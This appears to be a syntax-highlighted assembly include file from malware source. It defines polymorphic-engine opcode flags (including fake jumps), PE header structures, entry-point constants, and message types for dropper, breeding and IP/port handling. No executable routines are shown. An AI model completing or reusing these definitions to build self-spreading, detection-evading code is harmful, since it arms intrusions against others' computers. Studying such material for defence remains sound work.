</span><span class="sc5">CMD_SHL</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000200h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_SHR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000400h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_ROL</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000800h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_ROR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00001000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_SAR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00002000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_NOT</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00004000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_NEG</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00008000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_IMUL_EX</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_SHLD</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_SHRD</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_BTC</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00080000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_BTR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00100000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_BTS</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00200000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_BSWAP</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_XADD</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00800000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_MOVSXZX</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01000000h</span><span class="sc0">       </span><span class="sc1">; mov?x</span><span class="sc0">
</span><span class="sc5">CMD_BSR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">02000000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_BSF</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04000000h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_MUL</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08000000h</span><span class="sc0">
</span><span class="sc5">CMD_IMUL</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10000000h</span><span class="sc0">
</span><span class="sc5">CMD_DIV</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20000000h</span><span class="sc0">
</span><span class="sc5">CMD_IDIV</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">CMD_PUSHPOP</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">       </span><span class="sc1">; used when initializing regs</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">CMD_OLDSTUFF</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000FFFFFFh</span><span class="sc0">      </span><span class="sc1">; 1.00</span><span class="sc0">
</span><span class="sc5">CMD_NEWSTUFF</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0FF000000h</span><span class="sc0">      </span><span class="sc1">; 2.00+</span><span class="sc0">

</span><span class="sc5">CMD2_ALL</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">CMD2_PUSHPOPR</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">; push r; polycmd; pop r</span><span class="sc0">
</span><span class="sc5">CMD2_PUSHPOPC</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">; push c; polycmd; pop r</span><span class="sc0">
</span><span class="sc5">CMD2_IFOLLOW</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">; cmp r, c; jxx</span><span class="sc0">
</span><span class="sc5">CMD2_INOFOLLOW</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">; cmp r, c; jxx fake</span><span class="sc0">
</span><span class="sc5">CMD2_RFOLLOW</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">; cmp r, r; jxx</span><span class="sc0">
</span><span class="sc5">CMD2_RNOFOLLOW</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0">       </span><span class="sc1">; cmp r, r; jxx fake</span><span class="sc0">
</span><span class="sc5">CMD2_JXX</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000014h</span><span class="sc0">
</span><span class="sc5">CMD2_JXX_FAKE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000028h</span><span class="sc0">
</span><span class="sc5">CMD2_SUBROUTINE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; 8-()</span><span class="sc0">
</span><span class="sc5">CMD2_CYCLE</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">       </span><span class="sc1">; |-&gt;</span><span class="sc0">
</span><span class="sc5">CMD2_FPU</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100h</span><span class="sc0">       </span><span class="sc1">; X-)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">THREAD_PRIORITY_LOWEST</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_Name</span><span class="sc0">                 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_VirtualSize</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_VirtualAddress</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_SizeOfRawData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_PointerToRawData</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_PointerToRelocations</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_PointerToLinenumbers</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_NumberOfRelocations</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_NumberOfLinenumbers</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SH_Characteristics</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">PE_Magic</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">Machine</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">NumberOfSections</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">TimeDateStamp</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">PointerToSymbolTable</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">NumberOfSymbols</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">Characteristics</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">

</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                         </span><span class="sc1">; Image data directory</span><span class="sc0">
    </span><span class="sc5">DD_VirtualAddress</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; Virtual address</span><span class="sc0">
    </span><span class="sc5">DD_Size</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; Virtual size</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                      </span><span class="sc1">; All directories</span><span class="sc0">
    </span><span class="sc5">DE_Export</span><span class="sc0">           </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Import</span><span class="sc0">           </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Resource</span><span class="sc0">         </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Exception</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Security</span><span class="sc0">         </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_BaseReloc</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Debug</span><span class="sc0">            </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_Copyright</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_GlobalPtr</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_TLS</span><span class="sc0">              </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_LoadConfig</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_BoundImport</span><span class="sc0">      </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DE_IAT</span><span class="sc0">              </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                        </span><span class="sc1">; Optional Header</span><span class="sc0">
    </span><span class="sc5">OH_Magic</span><span class="sc0">                        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Palavra-chave         ***</span><span class="sc0">
    </span><span class="sc5">OH_MajorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Linker version</span><span class="sc0">
    </span><span class="sc5">OH_MinorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Linker version</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of code section</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfInitializedData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Initialized Data</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfUninitializedData</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Uninitialized Data</span><span class="sc0">
    </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">OH_BaseOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Code Virtual Address</span><span class="sc0">
    </span><span class="sc5">OH_BaseOfData</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Data Virtual Address</span><span class="sc0">
    </span><span class="sc5">OH_ImageBase</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">OH_SectionAlignment</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Usado no alinhamento da seÁ„o</span><span class="sc0">
    </span><span class="sc5">OH_FileAlignment</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Usado no alinhamento do arquivo</span><span class="sc0">
    </span><span class="sc5">OH_MajorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major OS</span><span class="sc0">
    </span><span class="sc5">OH_MinorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor OS</span><span class="sc0">
    </span><span class="sc5">OH_MajorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Image version</span><span class="sc0">
    </span><span class="sc5">OH_MinorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Image version</span><span class="sc0">
    </span><span class="sc5">OH_MajorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Subsys version</span><span class="sc0">
    </span><span class="sc5">OH_MinorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Subsys version</span><span class="sc0">
    </span><span class="sc5">OH_Win32VersionValue</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; win32 version</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfImage</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Tamanho da memoria     ***</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfHeaders</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of Header</span><span class="sc0">
    </span><span class="sc5">OH_CheckSum</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; unused</span><span class="sc0">
    </span><span class="sc5">OH_Subsystem</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Subsystem</span><span class="sc0">
    </span><span class="sc5">OH_DllCharacteristics</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">OH_SizeOfStackReserve</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack reserve</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfStackCommit</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack commit</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfHeapReserve</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap reserve</span><span class="sc0">
    </span><span class="sc5">OH_SizeOfHeapCommit</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap commit</span><span class="sc0">
    </span><span class="sc5">OH_LoaderFlags</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Loader flags</span><span class="sc0">
    </span><span class="sc5">OH_NumberOfRvaAndSizes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Numero de diretorios   ***</span><span class="sc0">
                                    </span><span class="sc9">UNION</span><span class="sc0">          </span><span class="sc1">; directory entries</span><span class="sc0">
    </span><span class="sc5">OH_DataDirectory</span><span class="sc0">                </span><span class="sc5">IMAGE_DATA_DIRECTORY\
</span><span class="sc0">                                    </span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">OH_DirectoryEntries</span><span class="sc0">             </span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                                    </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">ENDS</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0">

</span><span class="sc5">idata_rva</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0AF000h</span><span class="sc0">
</span><span class="sc5">SizeOfImage</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0B2000h</span><span class="sc0">
</span><span class="sc5">SectionAlignment</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">FileAlignment</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0B0000h</span><span class="sc0">
</span><span class="sc5">S2_NumberOfSections</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">MT_PROCESSDROPPER</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
</span><span class="sc5">MT_BLOCKIP</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
</span><span class="sc5">MT_APP</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">
</span><span class="sc5">MT_GENTEXT</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00001000b</span><span class="sc0">
</span><span class="sc5">MT_QUERY</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">
</span><span class="sc5">MT_BREED</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
</span><span class="sc5">MT_BLOOM</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">

</span><span class="sc5">MS_SENT</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">010000000000000000000000000000000b</span><span class="sc0">

</span><span class="sc5">MR_OK</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
</span><span class="sc5">MR_SEH</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
</span><span class="sc5">MR_SKIPSEH</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">
</span><span class="sc5">MR_ERROR</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00001000b</span><span class="sc0">
</span><span class="sc5">MR_DONE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">
</span><span class="sc5">MR_DELETE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">
</span><span class="sc5">MR_INVALID</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10000000b</span><span class="sc0">

</span><span class="sc5">m_why</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">m_result</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">m_dropper</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">m_buffer</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">m_ip</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">m_kind</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">m_muazzin</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">m_version</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">m_droppersize</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">m_port</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">m_iroutine</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">GMH</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">GPA</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">size_muazzin_struc</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">

